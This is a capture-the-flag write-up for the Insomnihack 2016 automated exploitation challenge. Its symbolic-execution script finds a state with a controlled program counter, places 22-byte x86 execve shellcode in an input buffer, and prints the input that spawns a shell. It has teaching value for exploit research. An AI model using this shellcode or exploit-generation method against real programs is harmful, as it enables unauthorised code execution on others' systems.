# Insomnihack 2016 - AEG

In this challenge we have to create an automated exploitation script.
We set the keep_unconstrained flag, that allows us to find states where we have control of the program counter, and set extra options that allow us to automatically get the address of our buffer.
We disable verbose step so that we don't get spammed with step info like registers etc.
```
load 'demo_bin'
keep_unconstrained
set_entry_state add_options=['REVERSE_MEMORY_NAME_MAP', 'TRACK_ACTION_HISTORY']

verbose_step False
```
## Find a vulnerable state

Here we search our exploitable state, by checking unconstrained states for symbolic program counters.
Once we have a state where we have a controlled program counter we move over to the exploitation step.
```
def fully_symbolic(state):
    fully_sym = True
    for s in (chop_symbol &reg.pc):
        if not (is_symbolic s):
            fully_sym = False

    return fully_sym
            
exploitable_state_index = -1
while exploitable_state_index < 0:
    println exploitable_state_index
    step
    unconst = len (list_states unconstrained)
    for i in range(unconst):
        print "Checking the unconstrained states to see if they give control over the pc.\nStates to check:  "
        println (len (list_states unconstrained))
        select_state i unconstrained
        if fully_symbolic &state:
            println "Vulnerable state found, continue to exploit..."
            exploitable_state_index = i
            break
        else:
            move_state_to_stash i 'unconstrained' 'pruned'
```

# Exploiting the vulnerability

Now all we have left to do is set our shellcode in the buffer and make the PC point to that shellcode.
To do this we get the addresses our input occupies, then we check for a place where we have space for the shellcode and return that address.
```
def check_payload_fit(addr, addresses, length):
    result = True
    for i in range(length):
        to_test = addr + i
        if to_test in addresses:
            result = True
        else:
            result = False
            break
    return result
        


def get_controled_buffer_addr(shellcode_length):
    buffer_name = ""
    for var in get_stdin_variables:
        for n in &vars.var[0].variables:
            buffer_name = n
    target_address = -1
    buffer_addresses = get_addr_for_name buffer_name
    for addr in buffer_addresses:
        if (check_payload_fit addr buffer_addresses shellcode_length):
            target_address = addr
            break
    return target_address

shell_code = 0x6a68682f2f2f73682f62696e89e331c96a0b5899cd80
control_buffer_addr = get_controled_buffer_addr 22
```

Finally, we have to add two constraints, one that sets the shellcode in our buffer and one that sets the PC to point to the shellcode
We check if we have found a valid control buffer address and if the required constraints are satisfiable.
If they are satisfiable we add them and print the exploit string in hex.
```
if satisfiable &reg.pc == control_buffer_addr && &mem[control_buffer_addr->22] == shell_code && control_buffer_addr > 0:
    add_constraint &mem[control_buffer_addr->22] == shell_code
    add_constraint &reg.pc == control_buffer_addr
    to_hex (dump_stdstream stdin)
    print "Required input to spawn a /bin/bash shell: "
    println (dump_stdstream stdin)
else:
    println "Could not place the shellcode in the buffer and set the PC to the buffer address"

```